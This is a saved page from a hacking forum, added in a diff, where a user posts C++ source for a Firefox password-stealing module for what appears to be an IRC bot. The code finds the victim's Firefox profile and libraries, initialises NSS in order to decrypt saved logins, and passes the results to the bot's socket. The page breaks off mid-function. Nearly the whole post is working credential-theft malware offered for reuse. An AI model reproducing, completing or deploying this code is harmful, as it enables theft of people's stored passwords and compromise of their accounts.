@@ -1,0 +1,3101 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+<meta name="Author" content="http://www.phpbbstyles.com" />
+
+<link rel="top" href="./index.php" title="Ryan1918 DOT COM Forum Index" />
+<link rel="search" href="./search.php" title="Search" />
+<link rel="help" href="./faq.php" title="FAQ" />
+<link rel="author" href="./memberlist.php" title="Memberlist" />
+<link rel="prev" href="viewtopic.php?t=9078&amp;view=previous" title="View previous topic" />
+<link rel="next" href="viewtopic.php?t=9078&amp;view=next" title="View next topic" />
+<link rel="up" href="viewforum.php?f=30" title="Code snippets - Suggestions - Rent a coder" />
+<link rel="chapter forum" href="viewforum.php?f=9" title="General Chat" />
+<link rel="chapter forum" href="viewforum.php?f=7" title="Introduction" />
+<link rel="chapter forum" href="viewforum.php?f=21" title="Graphics - Flash - Design - Templates" />
+<link rel="chapter forum" href="viewforum.php?f=46" title="The Fight Club" />
+<link rel="chapter forum" href="viewforum.php?f=61" title="Anything Funny - Pictures - Videos - Logs - Websites" />
+<link rel="chapter forum" href="viewforum.php?f=63" title="World News- Politics - Religion - Debates - Battles" />
+<link rel="chapter forum" href="viewforum.php?f=31" title="Web - Shell - Hosting Reviews - Coupons - Freebies" />
+<link rel="chapter forum" href="viewforum.php?f=3" title="News" />
+<link rel="chapter forum" href="viewforum.php?f=43" title="Blackmarket [BUY/SELL/TRADE]" />
+<link rel="chapter forum" href="viewforum.php?f=15" title="General Questions - Discussion" />
+<link rel="chapter forum" href="viewforum.php?f=6" title="Downloads - Requests" />
+<link rel="chapter forum" href="viewforum.php?f=34" title="Honeypots - Found Nets - Suspicious Files" />
+<link rel="chapter forum" href="viewforum.php?f=8" title="Exploits" />
+<link rel="chapter forum" href="viewforum.php?f=30" title="Code snippets - Suggestions - Rent a coder" />
+<link rel="chapter forum" href="viewforum.php?f=26" title="Proxy - Socks - HTTP - IRC - VNC - Wordlist" />
+<link rel="chapter forum" href="viewforum.php?f=60" title="Defacement - Show off" />
+<link rel="chapter forum" href="viewforum.php?f=19" title="Cracks - Hacks - Serials" />
+<link rel="chapter forum" href="viewforum.php?f=56" title="Phreaking - Cell Phone - Wireless - PDA - VOIP" />
+<link rel="chapter forum" href="viewforum.php?f=41" title="Tutorials - Papers - Research" />
+<link rel="chapter forum" href="viewforum.php?f=35" title="Applications" />
+<link rel="chapter forum" href="viewforum.php?f=23" title="Games" />
+<link rel="chapter forum" href="viewforum.php?f=62" title="Prank Radio - Pranks - Videos" />
+<link rel="chapter forum" href="viewforum.php?f=65" title="Magazines - E-Books - Books - Articles" />
+<link rel="chapter forum" href="viewforum.php?f=22" title="Music" />
+<link rel="chapter forum" href="viewforum.php?f=51" title="Movies - Videos - Talk" />
+<link rel="chapter forum" href="viewforum.php?f=55" title="Torrents - Invites - Trades" />
+<link rel="chapter forum" href="viewforum.php?f=20" title="Porn Sites - Requests - Trade" />
+<link rel="chapter forum" href="viewforum.php?f=57" title="Pictures" />
+<link rel="chapter forum" href="viewforum.php?f=58" title="Videos" />
+<link rel="chapter forum" href="viewforum.php?f=18" title="IRC Help - Downloads - Scripting - Networks" />
+<link rel="chapter forum" href="viewforum.php?f=12" title="*nix - Linux" />
+<link rel="chapter forum" href="viewforum.php?f=11" title="Windows" />
+<link rel="chapter forum" href="viewforum.php?f=1" title="News - Weekly Polls" />
+<link rel="chapter forum" href="viewforum.php?f=10" title="Links - Affiliates" />
+
+<title>Ryan1918 DOT COM :: View topic - firefox.cpp</title>
+<link rel="stylesheet" href="./templates/Morpheus/style_blue.css" type="text/css" />
+<style type="text/css">
+<!--
+@import url("./templates/Morpheus/formIE.css");
+-->
+</style>
+<script language="Javascript" type="text/javascript">
+<!--
+	if ( 0 )
+	{
+		window.open('privmsg.php?mode=newpm', '_phpbbprivmsg', 'HEIGHT=225,resizable=yes,WIDTH=400');;
+	}
+//-->
+</script>
+<!-- Start add - Birthday MOD -->
+
+<!-- End add - Birthday MOD -->
+<!-- Start add - Birthday MOD -->
+
+<!-- End add - Birthday MOD -->
+<script language="javascript" type="text/javascript">
+<!--
+
+var PreloadFlag = false;
+var expDays = 90;
+var exp = new Date();
+var tmp = '';
+var tmp_counter = 0;
+var tmp_open = 0;
+
+exp.setTime(exp.getTime() + (expDays*24*60*60*1000));
+
+function SetCookie(name, value)
+{
+	var argv = SetCookie.arguments;
+	var argc = SetCookie.arguments.length;
+	var expires = (argc > 2) ? argv[2] : null;
+	var path = (argc > 3) ? argv[3] : null;
+	var domain = (argc > 4) ? argv[4] : null;
+	var secure = (argc > 5) ? argv[5] : false;
+	document.cookie = name + "=" + escape(value) +
+		((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
+		((path == null) ? "" : ("; path=" + path)) +
+		((domain == null) ? "" : ("; domain=" + domain)) +
+		((secure == true) ? "; secure" : "");
+}
+
+function getCookieVal(offset)
+{
+	var endstr = document.cookie.indexOf(";",offset);
+	if (endstr == -1)
+	{
+		endstr = document.cookie.length;
+	}
+	return unescape(document.cookie.substring(offset, endstr));
+}
+
+function GetCookie(name)
+{
+	var arg = name + "=";
+	var alen = arg.length;
+	var clen = document.cookie.length;
+	var i = 0;
+	while (i < clen)
+	{
+		var j = i + alen;
+		if (document.cookie.substring(i, j) == arg)
+			return getCookieVal(j);
+		i = document.cookie.indexOf(" ", i) + 1;
+		if (i == 0)
+			break;
+	}
+	return null;
+}
+
+function ShowHide(id1, id2, id3)
+{
+	var res = expMenu(id1);
+	if (id2 != '') expMenu(id2);
+	if (id3 != '') SetCookie(id3, res, exp);
+}
+
+function expMenu(id)
+{
+	var itm = null;
+	if (document.getElementById)
+	{
+		itm = document.getElementById(id);
+	}
+	else if (document.all)
+	{
+		itm = document.all[id];
+	}
+	else if (document.layers)
+	{
+		itm = document.layers[id];
+	}
+	if (!itm)
+	{
+		// do nothing
+	}
+	else if (itm.style)
+	{
+		if (itm.style.display == "none")
+		{
+			itm.style.display = "";
+			return 1;
+		}
+		else
+		{
+			itm.style.display = "none";
+			return 2;
+		}
+	}
+	else
+	{
+		itm.visibility = "show";
+		return 1;
+	}
+}
+
+//-->
+</script>
+</head>
+<body bgcolor="#FFFFFF" text="#000000" link="#3B88C5" vlink="#3279B2" alink="#FF9C00">
+<a name="top"></a>
+<table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%">
+<tr>
+	<td width="10" class="border_left"><img src="./templates/Morpheus/images/spacer.gif" width="10" height="1" alt="" /></td>
+	<td width="100%" height="100%" class="content" align="center" valign="top">
+	<div id="header-box">
+		<div id="header-left"><a href="http://www.ryan1918.com"><img src="./templates/Morpheus/images/blue/logo_left.gif" width="125" height="69" alt="Ryan1918 DOT COM Forum Index" /></a></div>
+ 		<div id="header-right"><img src="./templates/Morpheus/images/blue/logo_right.gif" width="125" height="69" alt="" /></div>
+		<div id="header-center">
+
+		</div>
+	</div>
+	<div id="navigation">
+			&nbsp;<a href="http://www.ryan1918.com">Home</a>&nbsp; |
+			&nbsp;<a href="faq.php">FAQ</a>&nbsp; |
+			&nbsp;<a href="search.php">Search</a>&nbsp; |
+			&nbsp;<a href="memberlist.php">Memberlist</a>&nbsp; |
+			&nbsp;<a href="groupcp.php">Usergroups</a>&nbsp; |
+		&nbsp;<a href="chatroom.php">Chat</a>&nbsp; |
+			&nbsp;<a href="profile.php?mode=editprofile">Profile</a>&nbsp; |
+			&nbsp;<a href="privmsg.php?folder=inbox">Private Messages</a>&nbsp; |
+		&nbsp;<a href="http://www.ryan1918.com/viewtopic.php?t=1447">Affiliates</a>&nbsp; |
+			&nbsp;<a href="login.php?logout=true&amp;sid=bfed7ccaa91dbe9db8d1fcca192392e8">Log out (Carve)</a>&nbsp;
+	</div>
+	<div id="content">
+
+
+<table width="100%" cellspacing="1" cellpadding="4" border="0" align="center" class="nav">
+<tr>
+	<td class="nav" align="left" valign="middle" nowrap="nowrap"><span class="nav"><a href="index.php">Ryan1918 DOT COM Forum Index</a> &raquo; <a href="viewforum.php?f=30">Code snippets - Suggestions - Rent a coder</a></span></td>
+	<td class="nav navform" align="right" valign="middle" nowrap="nowrap"><span class="nav"><form action="search.php?mode=results" method="post" style="display: inline;"><input type="hidden" name="show_results" value="topics" /><input type="hidden" name="search_forum" value="30" />
+	<input type="text" name="search_keywords" class="post" size="15" />
+	<input type="submit" value="Search" class="mainoption" />
+	</form></span></td>
+</tr>
+</table>
+
+<table width="100%" cellspacing="2" cellpadding="2" border="0">
+  <tr>
+    <td align="left" valign="middle"><a href="posting.php?mode=reply&amp;t=9078"><img src="templates/Morpheus/images/lang_english/blue/reply.gif" border="0" alt="Reply to topic" align="middle" /></a></td>
+	 <td align="right" valign="middle"><div class="pagination"></div></td>
+  </tr>
+</table>
+
+
+
+<a name="71746"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap">firefox.cpp</td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">MaddY</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		
+		<br />
+Age: 23
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 08 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 45</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=71746#71746"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun Apr 29, 2007 6:48 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=71746"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">main.cpp
+<br />
+<table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="code"><tr> 	<td class="code_header">Code:</td></tr><tr>	<td class="code">else if &#40;strcmp&#40;&quot;firefox&quot;, a&#91;s&#93;&#41; == 0&#41; &#123;
+<br />
+&nbsp; &nbsp;FindFirefoxPasses&#40;sock, a&#91;2&#93;, notice&#41;; //you might wanna replace it with CreateThread
+<br />
+&#125;</td>	</tr></table>
+<br />
+
+<br />
+firefox.cpp
+<br />
+<table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="code"><tr> 	<td class="code_header">Code:</td></tr><tr>	<td class="code">#include &quot;../../headers/includes.h&quot;
+<br />
+#include &quot;../../headers/functions.h&quot;
+<br />
+#include &quot;../../headers/externs.h&quot;
+<br />
+
+<br />
+#define NSS_LIBRARY_NAME&nbsp; &nbsp;&quot;nss3.dll&quot;
+<br />
+#define PLC_LIBRARY_NAME&nbsp; &nbsp;&quot;plc4.dll&quot;
+<br />
+#define NSPR_LIBRARY_NAME&nbsp; &quot;nspr4.dll&quot;
+<br />
+#define PLDS_LIBRARY_NAME&nbsp; &quot;plds4.dll&quot;
+<br />
+#define SOFTN_LIBRARY_NAME &quot;softokn3.dll&quot;
+<br />
+
+<br />
+#define GETPROCADDRESS&nbsp; GetProcAddress
+<br />
+#define FREELIBRARY&nbsp; &nbsp; &nbsp;FreeLibrary
+<br />
+
+<br />
+typedef struct PK11SlotInfoStr PK11SlotInfo;
+<br />
+
+<br />
+// NSS Library functions
+<br />
+typedef SECStatus&nbsp; &nbsp; &nbsp; &#40;*NSS_Init&#41; &#40;const char *configdir&#41;;
+<br />
+typedef SECStatus&nbsp; &nbsp; &nbsp; &#40;*NSS_Shutdown&#41; &#40;void&#41;;
+<br />
+typedef PK11SlotInfo * &#40;*PK11_GetInternalKeySlot&#41; &#40;void&#41;;
+<br />
+typedef void&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#40;*PK11_FreeSlot&#41; &#40;PK11SlotInfo *slot&#41;;
+<br />
+typedef SECStatus&nbsp; &nbsp; &nbsp; &#40;*PK11_CheckUserPassword&#41; &#40;PK11SlotInfo *slot,char *pw&#41;;
+<br />
+typedef SECStatus&nbsp; &nbsp; &nbsp; &#40;*PK11_Authenticate&#41; &#40;PK11SlotInfo *slot, PRBool loadCerts, void *wincx&#41;;
+<br />
+typedef SECStatus&nbsp; &nbsp; &nbsp; &#40;*PK11SDR_Decrypt&#41; &#40;SECItem *data, SECItem *result, void *cx&#41;;
+<br />
+
+<br />
+// PLC Library functions
+<br />
+typedef char *&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#40;*PL_Base64Decode&#41;&#40; const char *src, PRUint32 srclen, char *dest&#41;;
+<br />
+
+<br />
+NSS_Init&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NSSInit;
+<br />
+NSS_Shutdown&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NSSShutdown;
+<br />
+PK11_GetInternalKeySlot PK11GetInternalKeySlot;
+<br />
+PK11_CheckUserPassword&nbsp; PK11CheckUserPassword;
+<br />
+PK11_FreeSlot&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PK11FreeSlot;
+<br />
+PK11_Authenticate&nbsp; &nbsp; &nbsp; &nbsp;PK11Authenticate;
+<br />
+PK11SDR_Decrypt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PK11SDRDecrypt;
+<br />
+PL_Base64Decode&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PLBase64Decode;
+<br />
+
+<br />
+char masterPassword&#91;1024&#93;;
+<br />
+int IsNSSInitialized = 0;
+<br />
+
+<br />
+HMODULE libnss = NULL;
+<br />
+HMODULE libplc = NULL;
+<br />
+HMODULE libtmp = NULL;
+<br />
+
+<br />
+int FindFirefoxPasses&#40;SOCKET sock, char *dest, BOOL notice&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;char *profileDir, /**masterPassword, */*firefoxDir;
+<br />
+&nbsp; &nbsp;profileDir = GetCurrentUserProfilePath&#40;&#41;;
+<br />
+&nbsp; &nbsp;firefoxDir = GetFirefoxLibPath&#40;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; InitializeFirefoxLibrary&#40;firefoxDir&#41; &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; InitializeNSSLibrary&#40;profileDir, masterPassword&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;DumpSignonSecrets&#40;profileDir, sock, dest, notice&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+&#125;
+<br />
+
+<br />
+char *GetCurrentUserProfilePath&#40;&#41;
+<br />
+&#123;
+<br />
+
+<br />
+char profilePath&#91;_MAX_PATH&#93; = &quot;&quot;;
+<br />
+char partialPath&#91;&#93; = &quot;Application Data\\Mozilla\\Firefox&quot;;
+<br />
+char profileFile&#91;_MAX_PATH&#93;;
+<br />
+char line&#91;1024&#93;;
+<br />
+
+<br />
+DWORD pathSize = _MAX_PATH;
+<br />
+char *finalProfilePath = NULL;
+<br />
+int&nbsp; isDefaultFound = 0;
+<br />
+HANDLE token;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Get current user's profile directory
+<br />
+&nbsp; &nbsp;if&#40; fOpenProcessToken&#40;GetCurrentProcess&#40;&#41;, TOKEN_QUERY, &amp;token&#41; == FALSE &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Failed to get current process token &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40; fGetUserProfileDirectory&#40;token, profilePath, &amp;pathSize&#41; == FALSE &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Failed to get user profile directory&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n User Profile directory = %s&quot;, profilePath&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Get firefox profile directory
+<br />
+&nbsp; &nbsp;strcpy&#40;profileFile, profilePath&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;profileFile,&quot;\\&quot;&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;profileFile,partialPath&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;profileFile,&quot;\\profiles.ini&quot;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Open the firefox profile setting file
+<br />
+&nbsp; &nbsp;FILE *profile = fopen&#40;profileFile, &quot;r&quot;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40; profile == NULL &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Unable to find firefox profile file &#58; %s &quot;, profileFile&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// Check each line of profile settings file for line &quot;name=default&quot; string
+<br />
+&nbsp; &nbsp;// This indicates that we are looking under default profile...
+<br />
+&nbsp; &nbsp;// So one among next few lines will have path information..just copy that...
+<br />
+
+<br />
+&nbsp; &nbsp;while&#40;fgets&#40;line, 1024, profile&#41;&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;StrLwr&#40;line&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !isDefaultFound &amp;&amp; &#40; strstr&#40;line, &quot;name=default&quot;&#41; != NULL&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;isDefaultFound = 1;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;continue;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// We have got default profile ..now check for path
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; isDefaultFound &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; strstr&#40;line,&quot;path=&quot;&#41; != NULL&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;char *slash = strstr&#40;line,&quot;/&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; slash != NULL &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;*slash = '\\';
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// remove \n from the end of line
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;line&#91;strlen&#40;line&#41;-1&#93; = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;char *start = strstr&#40;line,&quot;=&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;int totalLen = strlen&#40;profilePath&#41; + strlen&#40;partialPath&#41; + strlen&#40;start&#41; + 3 ;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;finalProfilePath = &#40;char *&#41; malloc&#40;totalLen&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; finalProfilePath &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;finalProfilePath,profilePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;finalProfilePath,&quot;\\&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;finalProfilePath,partialPath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;finalProfilePath,&quot;\\&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;finalProfilePath,start+1&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Final profile path is &#58; %s &quot;, finalProfilePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;fclose&#40;profile&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;return finalProfilePath;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+char *GetFirefoxLibPath&#40;&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;char regSubKey&#91;&#93;&nbsp; &nbsp; = &quot;SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command&quot;;
+<br />
+&nbsp; &nbsp;char path&#91;_MAX_PATH&#93; =&quot;&quot;;
+<br />
+&nbsp; &nbsp;char *firefoxPath = NULL;
+<br />
+&nbsp; &nbsp;DWORD pathSize = _MAX_PATH;
+<br />
+&nbsp; &nbsp;DWORD valueType;
+<br />
+&nbsp; &nbsp;HKEY rkey;
+<br />
+
+<br />
+&nbsp; &nbsp;// Open firefox registry key
+<br />
+&nbsp; &nbsp;if&#40; fRegOpenKeyEx&#40;HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &amp;rkey&#41; != ERROR_SUCCESS &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Failed to open the firefox registry key &#58; HKCU\\%s&quot;, regSubKey &#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// Read the firefox path value
+<br />
+&nbsp; &nbsp;if&#40; fRegQueryValueEx&#40;rkey, NULL, 0,&nbsp; &amp;valueType, &#40;unsigned char*&#41;&amp;path, &amp;pathSize&#41; != ERROR_SUCCESS &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Failed to read the firefox path value from registry &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;fRegCloseKey&#40;rkey&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125; 
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40; pathSize &lt;= 0 || path&#91;0&#93; == 0&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Path value read from the registry is empty&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;fRegCloseKey&#40;rkey&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return NULL;
+<br />
+&nbsp; &nbsp;&#125;&nbsp; &nbsp;
+<br />
+
+<br />
+&nbsp; &nbsp;fRegCloseKey&#40;rkey&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;// This path may contain extra double quote....
+<br />
+&nbsp; &nbsp;if&#40; path&#91;0&#93; == '\&quot;' &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;for&#40;unsigned int i=0; i&lt; strlen&#40;path&#41;-1 ; i++&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;path&#91;i&#93; = path&#91;i+1&#93;;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Path value read from registry is %s&quot;, path&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;// Terminate the string at last &quot;\\&quot;
+<br />
+&nbsp; &nbsp;for&#40;int j=strlen&#40;path&#41;-1; j&gt;0; j--&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; path&#91;j&#93; == '\\' &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;path&#91;j&#93;=0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;firefoxPath = &#40;char*&#41; malloc&#40; strlen&#40;path&#41; + 1&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40; firefoxPath &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;firefoxPath, path&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Firefox path = &#91;%s&#93; &quot;, firefoxPath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;return firefoxPath;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+int InitializeFirefoxLibrary&#40;char *firefoxPath&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;libnss = libplc = NULL;
+<br />
+
+<br />
